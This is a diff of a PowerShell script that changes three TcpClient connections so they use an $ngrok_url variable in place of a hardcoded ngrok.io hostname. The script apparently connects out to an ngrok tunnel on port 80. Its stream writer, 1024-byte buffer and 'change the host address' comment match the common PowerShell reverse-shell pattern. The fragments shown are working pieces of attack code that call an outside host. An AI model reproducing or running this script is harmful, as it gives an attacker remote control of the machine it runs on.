@@ -3,7 +3,7 @@
 
 $ngrok_url = 'xxxx.ngrok.io'
 
-$socket = new-object System.Net.Sockets.TcpClient(ngrok_url, 80);
+$socket = new-object System.Net.Sockets.TcpClient($ngrok_url, 80);
 if($socket -eq $null){exit 1}
 $stream = $socket.GetStream();
 $writer = new-object System.IO.StreamWriter($stream);
@@ -58,7 +58,7 @@ $writer.close();
 $socket.close();
 $stream.Dispose()
 
-$socket = new-object System.Net.Sockets.TcpClient('2672d6a32b10.ngrok.io', 80);
+$socket = new-object System.Net.Sockets.TcpClient($ngrok_url, 80);
 if($socket -eq $null){exit 1}
 $stream = $socket.GetStream();
 $writer = new-object System.IO.StreamWriter($stream);
@@ -108,7 +108,7 @@ $data = $null;
 $result = $null;
 try {
         # change the host address and/or port number as necessary
-        $client = New-Object Net.Sockets.TcpClient("2672d6a32b10.ngrok.io", 80);
+        $client = New-Object Net.Sockets.TcpClient($ngrok_url, 80);
         $stream = $client.GetStream();
         $buffer = New-Object Byte[] 1024;
         $encoding = New-Object Text.AsciiEncoding;
